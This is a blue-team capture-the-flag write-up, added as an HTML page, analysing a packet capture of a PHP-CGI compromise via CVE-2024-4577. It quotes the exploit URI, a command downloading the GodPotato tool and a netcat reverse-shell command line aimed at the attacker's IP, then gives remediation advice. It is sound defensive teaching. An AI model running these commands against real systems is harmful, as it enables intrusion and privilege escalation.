@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <title>PacketPuzzle - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/PacketPuzzle.html" />
+    <!-- Sherlock-specific metadata for SEO -->
+    <meta name="description" content="Writeup for PacketPuzzle sherlock - Easy difficulty level">
+    <meta name="keywords" content="Sherlock, PacketPuzzle, Easy, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../sherlocks.html" class="logo">Sherlock writeups</a>
+            <div class="header-controls">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="veasy">VEasy</button>
+            <div class="sherlock-list" id="veasy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="sherlock-list" id="easy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="sherlock-list" id="medium-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="sherlock-list" id="hard-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="sherlock-list" id="insane-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">PacketPuzzle</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty easy">Easy</span>
+            <span class="date">March 5, 2026</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Sherlock-specific content goes here -->
+                <p><img alt="solved" src="../images/PacketPuzzle/solved.png" /></p>
+<pre class="codehilite"><code>You are a junior security analyst at a small Japanese cryptocurrency trading company.
+After detecting suspicious activity on the internal network, you exported a PCAP for further investigation.
+Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions.
+</code></pre>
+
+<h1>Task 1</h1>
+<p><code>What is the source IP address of the attacker involved in this Attack?</code></p>
+<p>The challenge archive contains a single PCAP file. For starters, I will filter for HTTP traffic as it is a low-hanging fruit, with easily readable data.</p>
+<p><img alt="http" src="../images/PacketPuzzle/http.png" /></p>
+<p>The IP address of <code>192.168.170.128</code> sends 7 POST requests to the victim, using a certain exploit related to PHP in order to achieve RCE.</p>
+<p><img alt="task1" src="../images/PacketPuzzle/task1.png" /></p>
+<h1>Task 2</h1>
+<p><code>How many open ports did the attacker discover on the victim's system?</code></p>
+<p>Filtering the packets by <code>ip.src</code> equal to the attacker's IP address reveals an interesting sequence of events.</p>
+<p><img alt="scan" src="../images/PacketPuzzle/scan.png" /></p>
+<p>The attacker sends TCP packets with the SYN flag to a massive number of ports, responding to particular ones with an RST packet. This is a <code>SYN scan</code>, and the ports that received back the RST packets were recognized as active.</p>
+<p>Instead of completing the usual 3-way handshake, a SYN scan only requires a SYN/ACK response to determine that the port is open. Thus, an RST packet is sent after receiving a positive response, effectively ending the conversation. More details can be found in the nmap docs.</p>
+<p><a href="https://nmap.org/book/synscan.html">https://nmap.org/book/synscan.html</a></p>
+<p>Counting up all of the active ports, there are:</p>
+<pre class="codehilite"><code>22
+443
+445
+3389
+139
+80
+135
+5357
+</code></pre>
+
+<p>8 open ports in total.</p>
+<p><img alt="task2" src="../images/PacketPuzzle/task2.png" /></p>
+<h1>Task 3</h1>
+<p><code>What is the first open port that responded on the victim's system during reconnaissance?</code></p>
+<p>The first open port found during the SYN scan is <code>22</code>, as seen in the first screenshot from Question 2.</p>
+<p><img alt="task3" src="../images/PacketPuzzle/task3.png" /></p>
+<h1>Task 4</h1>
+<p><code>What is the CVE identifier for the vulnerability exploited by the attacker?</code></p>
+<p>This line <code>POST /?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input</code> from the POST request is very reminiscent of CVE-2012-1823, which is an argument injection flaw in <code>php-cgi</code>. An attacker can flip PHP options using the -d flag.</p>
+<p>In this case, a newer, yet very similar CVE is used. The only difference between this and <code>CVE-2024-4577</code> is that the newer one uses a soft hyphen (%AD in URL encoding) in the URL. This trick works on Windows, where the soft hyphen changes to <code>-</code> after being passed to <code>php-cgi.exe</code>, allowing for the same argument injection exploit.</p>
+<p>Ultimately, this flaw allows an attacker to execute arbitrary commands on the system after flipping these two PHP attributes.</p>
+<p><img alt="task4" src="../images/PacketPuzzle/task4.png" /></p>
+<h1>Task 5</h1>
+<p><code>What is the name and version of the vulnerable product exploited to get RCE?</code></p>
+<p>I'll start looking through the POST request, starting from the earliest one.</p>
+<p><img alt="command" src="../images/PacketPuzzle/command.png" /></p>
+<p>The first command executed by the attacker was <code>whoami</code>. The response reveals that the PHP version is <code>8.1.25</code>, which fits into the vulnerable range of the more recent CVE.</p>
+<p><img alt="task5" src="../images/PacketPuzzle/task5.png" /></p>
+<h1>Task 6</h1>
+<p><code>What is the username of the victim account?</code></p>
+<p>As seen in the screenshot within Question 5, the discovered user's name is <code>cristo</code></p>
+<p><img alt="task6" src="../images/PacketPuzzle/task6.png" /></p>
+<h1>Task 7</h1>
+<p><code>At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?</code></p>
+<p>The initial <code>whoami</code> command was followed by a few recon commands like <code>dir</code>, <code>whoami /all</code>, ultimately culminating with a reverse shell command.</p>
+<p><img alt="revshell" src="../images/PacketPuzzle/revshell.png" /></p>
+<p>This event occurred at <code>2025-01-22T09:47:32.295911000Z</code>, marking the moment when the attacker gained their foothold on the system.</p>
+<p><img alt="task7" src="../images/PacketPuzzle/task7.png" /></p>
+<h1>Task 8</h1>
+<p><code>What is the MITRE ATT&amp;CK technique ID used by the attacker to gain an initial foothold?</code></p>
+<p>Using everything I've learned so far, I can confidently say that the MITRE ATT&amp;CK technique ID used is <code>T1190 - Exploit Public-Facing Application</code>. The attacker exploited the argument injection flaw by reaching a public-facing component with a POST request.</p>
+<p><a href="https://attack.mitre.org/techniques/T1190/">https://attack.mitre.org/techniques/T1190/</a></p>
+<p><img alt="task8" src="../images/PacketPuzzle/task8.png" /></p>
+<h1>Task 9</h1>
+<p><code>What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?</code></p>
+<p>After the foothold was attained, I switched the Wireshark filter to see all packets coming towards the attacker.</p>
+<p><img alt="suspicious" src="../images/PacketPuzzle/suspicious.png" /></p>
+<p>Right after the initial exploit responses, I can see a TCP packet containing something that looks like a fragment of a <code>dir</code> command output.</p>
+<p><img alt="follow" src="../images/PacketPuzzle/follow.png" /></p>
+<p>Following this packet reveals the stream of actions taken by the attacker, starting with directory enumeration, reading the Apache license(this might have been an attempt at hiding their tracks).</p>
+<p><img alt="wget" src="../images/PacketPuzzle/wget.png" /></p>
+<p>After their enumeration, the attacker downloaded <code>netcat</code> from their server and saved it as <code>time.exe.</code></p>
+<p>This was followed by the attacker grabbing a different tool with <code>iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile TimeProvider.exe</code>, aiming to exploit the SeImpersonate privilege for privilege escalation.</p>
+<p><img alt="task9" src="../images/PacketPuzzle/task9.png" /></p>
+<h1>Task 10</h1>
+<p><code>What is the command line used by the attacker while performing privilege escalation?</code></p>
+<p><img alt="failed" src="../images/PacketPuzzle/failed.png" /></p>
+<p>The attacker tried to elevate their privileges, but the command errored out. The commadn they used was <code>./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"</code></p>
+<p><img alt="task10" src="../images/PacketPuzzle/task10.png" /></p>
+<h1>Task 11</h1>
+<p><code>The attacker failed to escalate privileges and was given an error. What is the error?</code></p>
+<p>The <code>Cannot create process Win32Error:2</code> error arises from the <code>CreateProcess</code> function, and it means the system cannot find the specified file, usually due to a missing executable, incorrect file path, or broken dependencies. In this case, it  is most likely that netcat(disguised as time.exe) itself was detected and removed by real-time protection.</p>
+<p>I think that is what happened, mainly because the attacker ran the GodPotato command twice, with the exploit working perfectly(found SYSTEM token and attained the SYSTEM user). If it were GodPotato that was removed, the second command would not show any output related to GP, aside from a generic Windows error.</p>
+<p><img alt="task11" src="../images/PacketPuzzle/task11.png" /></p>
+<p>Solved!</p>
+<h1>Remediation &amp; Strategic Recommendations</h1>
+<p>To prevent similar compromises in the future, the following actions are recommended, following the Defense in Depth strategy:</p>
+<ol>
+<li>Immediate Fix: Patching the RCE (CVE-2024-4577)</li>
+</ol>
+<p>The primary entry point was an argument injection vulnerability in php-cgi.exe.</p>
+<ul>
+<li>
+<p>Update PHP: Upgrade the PHP runtime to the latest patched version (8.1.29+, 8.2.20+, or 8.3.8+). This is the only definitive fix for the soft-hyphen (%AD) injection flaw.</p>
+</li>
+<li>
+<p>Disable Legacy CGI: If business requirements allow, migrate from php-cgi.exe to a more modern and secure architecture like PHP-FPM or a native Apache/IIS module.</p>
+</li>
+<li>
+<p>WAF Implementation: Deploy a Web Application Firewall (WAF) rule to filter and block suspicious URL-encoded characters (like %AD) and PHP configuration flags (-d, allow_url_include) in incoming GET/POST requests.</p>
+</li>
+<li>
+<p>Privilege Hardening: Blocking Escalation (Defense in Depth)</p>
+</li>
+</ul>
+<p>While the attacker attained SYSTEM tokens, they were hindered by the removal of their payload. To prevent any future "Potato-style" exploits from succeeding:</p>
+<ul>
+<li>
+<p>Remove SeImpersonatePrivilege: The account running the web server should not hold this privilege. Removing it disables the ability for an attacker to steal and spoof SYSTEM tokens, even if they achieve RCE.</p>
+</li>
+<li>
+<p>Dedicated Service Account: Move the PHP execution environment to a dedicated low-privileged local user with strictly defined filesystem permissions.</p>
+</li>
+<li>
+<p>Detection &amp; Monitoring Improvements</p>
+</li>
+<li>
+<p>Enhance Endpoint Logging: If not enabled already, enable PowerShell Script Block Logging (Event ID 4104). This would allow the SOC to see de-obfuscated scripts executed directly in memory, which often follow a successful privilege escalation.</p>
+</li>
+<li>
+<p>Sysmon Integration: Monitor for suspicious Parent-Child process relationships, specifically php-cgi.exe spawning shells (cmd.exe, powershell.exe) or network-active binaries (nc.exe, time.exe).</p>
+</li>
+<li>
+<p>EDR Tuning: Configure the EDR to alert on any process attempting to interact with the RPCSS service or creating named pipes with patterns used by known exploits (e.g., \pipe\epmapper).</p>
+</li>
+</ul>
+<p>The attacker successfully exploited a critical PHP vulnerability to gain a foothold but failed to establish a persistent reverse shell due to Windows Defender's real-time protection intercepting the secondary payload. Implementing the above recommendations will close the initial attack vector and neuter the ability for future attackers to elevate their privileges to SYSTEM.</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <!-- Include the Markdown parser (not needed for static HTML) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Sherlock metadata for sidebar population
+        let sherlockData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch sherlock metadata
+                const response = await fetch('../sherlocks.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load sherlock metadata');
+                }
+                sherlockData = await response.json();
+                
+                // Populate the sidebar with sherlock links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with sherlock links dynamically
+        function populateSidebar() {
+            const categories = {
+                "veasy": document.getElementById("veasy-sherlocks"),
+                "easy": document.getElementById("easy-sherlocks"),
+                "medium": document.getElementById("medium-sherlocks"),
+                "hard": document.getElementById("hard-sherlocks"),
+                "insane": document.getElementById("insane-sherlocks")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add sherlock links to appropriate categories
+            for (const [sherlockName, data] of Object.entries(sherlockData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../sherlocks/${sherlockName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current sherlock
+                    if (data.title === "PacketPuzzle") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const sherlockList = document.querySelector(`#${difficulty}-sherlocks`);
+                    
+                    sherlockList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
